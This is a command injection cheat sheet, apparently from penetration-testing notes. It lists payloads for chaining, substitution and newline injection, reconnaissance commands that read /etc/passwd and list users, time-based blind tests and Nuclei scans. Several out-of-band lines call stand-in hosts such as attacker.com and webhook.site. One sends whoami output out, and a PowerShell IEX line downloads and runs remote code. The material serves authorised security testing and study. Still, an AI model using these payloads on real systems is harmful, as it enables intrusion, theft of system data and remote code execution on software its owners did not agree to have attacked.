# Command Injection

# Exploitation

## Basic Command Chaining
```
; ls -la
```

## Using logic operators
```
&& ls -la
```

## Commenting out the rest of a command
```
; ls -la #
```

## Using a pipe for command chaining
```
| ls -la
```

## Testing for blind injection
```
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

## Out-of-band testing
```
& nslookup webhook.site/<id>?`whoami` &
```

## Command Separator Tests

### Semicolon (;) - Command sequencing
```
command1;command2        # Executes commands sequentially
ping 127.0.0.1;id       # Executes ping, then id
echo test;whoami        # Outputs test, then username
```
### Ampersand (&) - Background processing
```
command1&command2       # Executes both commands in background
ping 127.0.0.1&dir     # Starts ping and immediately runs dir
whoami&hostname        # Runs both commands simultaneously
```
### Double Ampersand (&&) - Conditional execution
```
command1&&command2      # Executes command2 only if command1 succeeds
ping 127.0.0.1&&whoami # Runs whoami only if ping succeeds
cd /tmp&&ls -la        # Lists directory only if cd succeeds
```
### Pipe (|) - Output redirection
```
command1|command2      # Sends output of command1 to command2
whoami|tr a-z A-Z     # Converts username to uppercase
ls -la|grep root      # Lists files and filters for 'root'
```


## Command Substitution Tests

### Backtick (`) substitution
```
`command`             # Classic command substitution
echo `whoami`        # Outputs result of whoami
ping `hostname`      # Pings the result of hostname
```

### Dollar substitution
```
$(command)           # Modern command substitution
echo $(id)          # Outputs result of id
cat $(locate passwd) # Reads files found by locate
```

### Nested substitution
```
$(echo `whoami`)    # Nested classic in modern
`echo $(hostname)`  # Nested modern in classic
``` 

## Newline Injection Tests
### URL encoded newlines
```
command1%0acommand2  # %0a represents \n
ping%0aid           # Executes ping, then id on new line
whoami%0als         # Runs whoami, then ls
```

### Carriage return injection
```
command1%0dcommand2  # %0d represents \r
echo test%0dcat /etc/passwd  # Potentially bypasses filters
```

## OS Detection Tests
### Windows specific commands
```
ver                  # Shows Windows version
systeminfo          # Detailed system information
type C:\Windows\System32\drivers\etc\hosts  # Reads hosts file
net user            # Lists users
dir C:\             # Lists root directory
```
### Linux specific commands
```
uname -a            # Kernel and system information
cat /etc/issue      # Distribution information
cat /proc/version   # Kernel version information
lsb_release -a      # Distribution details
cat /etc/passwd     # User account information
```

## Out-of-Band Tests

### DNS based detection
```
nslookup uniquestring.attackerdomain.com  # Generates DNS lookup
ping uniquestring.attackerdomain.com      # ICMP based detection
dig uniquestring.attackerdomain.com       # DNS query tool
```

### HTTP based detection
```
wget http://attacker.com/uniquestring     # Generates HTTP GET
curl http://attacker.com/uniquestring     # Alternative HTTP request
powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com') # PowerShell web request
```

## Time-based Tests
### Linux Delay Commands
```
ping -c 10 127.0.0.1    # 10 second delay using ping
sleep 10               # Direct delay command
perl -e "sleep 10"     # Perl based delay
python -c "import time; time.sleep(10)"  # Python delay
```

### Windows Delay Commands
```
ping -n 10 127.0.0.1   # Windows ping delay
timeout 10             # Windows timeout command
Start-Sleep -s 10      # PowerShell sleep
```

## Automated Discovery

### Using Nuclei

```
# Run command injection templates
nuclei -u http://target.com -t cmd-injection/

# Run with custom templates
nuclei -u http://target.com -t custom-cmd.yaml

# Severity based scanning
nuclei -u http://target.com -t cmd-injection/ -severity critical,high
```